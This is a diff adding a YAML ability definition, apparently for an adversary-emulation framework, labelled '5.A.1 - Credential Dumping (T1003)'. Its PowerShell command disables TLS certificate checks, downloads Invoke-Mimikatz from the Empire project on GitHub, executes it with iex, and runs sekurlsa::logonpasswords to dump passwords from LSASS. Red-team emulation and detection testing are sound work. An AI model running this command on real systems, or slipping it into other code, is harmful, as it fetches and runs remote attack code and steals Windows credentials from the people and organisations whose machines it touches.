@@ -1,0 +1,22 @@
+---
+
+- id: 4ef6009d-2d62-4bb4-8de9-0458df2e9567
+  name: 5.A.1 - Credential Dumping (T1003)
+  description: Mimikatz sekurlsa::logonpasswords is executed via Invoke-Mimikatz to dump passwords via process access into LSASS.
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+          $web = (New-Object System.Net.WebClient);
+          $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+          iex $result;
+          function logonpasswords
+          {
+              Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit"
+          };
+          logonpasswords;
